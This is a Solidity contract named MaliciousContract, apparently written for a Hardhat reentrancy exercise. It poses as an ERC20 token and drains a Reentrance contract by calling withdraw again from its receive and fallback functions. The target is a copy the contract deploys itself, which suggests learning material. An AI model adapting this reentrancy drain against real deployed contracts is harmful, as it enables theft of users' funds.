// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "hardhat/console.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "./Reentrance.sol";

contract MaliciousContract is ERC20 {

    address private owner;
    uint256 _amountToBeWithdrawn = 1 ether;
    Reentrance ren = new Reentrance();

    constructor() ERC20 ("Space Coin", "SPX") {
        //owner = msg.sender;
        owner = 0x5FbDB2315678afecb367f032d93F642f64180aa3;
        console.log("Malicious Contract's owner: ", msg.sender);
    }

    function donate(address _to) public payable {
        //console.log("MaliciousContract amount: ", msg.value, _to, address(ren));
        (bool success, bytes memory data) = address(ren).call{value: msg.value, gas: 23000}(abi.encodeWithSignature("donate(address)", _to));
    }

    function withdraw() public {
        ren.withdraw(_amountToBeWithdrawn);
    }

    function getBalance(address _who) public view returns (uint balance) {
        balance = ren.balanceOf(_who);
        //console.log("MaliciousContract balance: ", balance, _who);
        return balance;
    }

    function balanceOfCurrent() public view returns (uint balance) {
        return balanceOf(owner);
    }

    receive() external payable {
        console.log("within receive");
        ren.withdraw(_amountToBeWithdrawn);
    }

    fallback() external payable {
        //console.log("within fallback");
        ren.withdraw(_amountToBeWithdrawn);
    }
}
